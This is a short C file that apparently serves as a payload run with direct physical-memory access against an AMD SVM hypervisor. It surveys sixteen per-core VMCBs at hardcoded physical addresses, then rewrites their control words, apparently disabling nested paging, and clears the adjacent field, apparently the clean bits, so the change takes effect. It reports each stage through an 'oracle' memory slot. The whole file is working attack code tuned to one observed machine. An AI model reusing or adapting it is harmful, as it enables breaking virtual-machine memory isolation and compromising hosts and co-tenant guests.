#include <stdint.h>

#define ENTERED      0x1270a9e17e5e2001ULL
#define COMPLETE     0x1270a9e17e5e2002ULL
#define REJECTED     0x1270a9e17e5e2003ULL
#define WRITE_FAILED 0x1270a9e17e5e2004ULL
#define VMCB_BASE_PA 0x62a57000ULL
#define VMCB_STRIDE  0x2000ULL

static uint64_t read64(uint64_t va)
{
  return *(volatile uint64_t *)(uintptr_t)va;
}

static void write64(uint64_t va, uint64_t value)
{
  *(volatile uint64_t *)(uintptr_t)va = value;
}

void vmcb_probe_1270(uint64_t *param)
{
  uint64_t dmap = param[1];
  uint64_t oracle = param[2];
  write64(oracle, ENTERED);

  // Validate every target before changing any VMCB. A second S3 cycle may
  // encounter either fresh controls (9) or controls already cleared (8).
  // Physical layout was first observed in the read-only survey on this unit.
  for (uint64_t core = 0; core < 16; ++core) {
    uint64_t vpa = VMCB_BASE_PA + core * VMCB_STRIDE;
    uint64_t ctrl = read64(dmap + vpa + 0x90);
    uint64_t ncr3 = read64(dmap + vpa + 0xb0);
    if ((ctrl & ~1ULL) != 8 || (ncr3 >> 24) != 0x62 ||
        (ncr3 & 0xfff)) {
      write64(oracle + 8, core);
      // NPT root is page aligned; its low bits can carry the rejected control.
      write64(oracle + 16, ncr3 | ctrl);
      write64(oracle, REJECTED);
      return;
    }
  }

  for (uint64_t core = 0; core < 16; ++core) {
    uint64_t ctrl_va = dmap + VMCB_BASE_PA + core * VMCB_STRIDE + 0x90;
    write64(ctrl_va, 8);
    *(volatile uint32_t *)(uintptr_t)(ctrl_va + 0x30) = 0;
    if (read64(ctrl_va) != 8) {
      write64(oracle + 8, core);
      write64(oracle, WRITE_FAILED);
      return;
    }
  }

  write64(oracle + 8, 16);
  write64(oracle, COMPLETE);
}
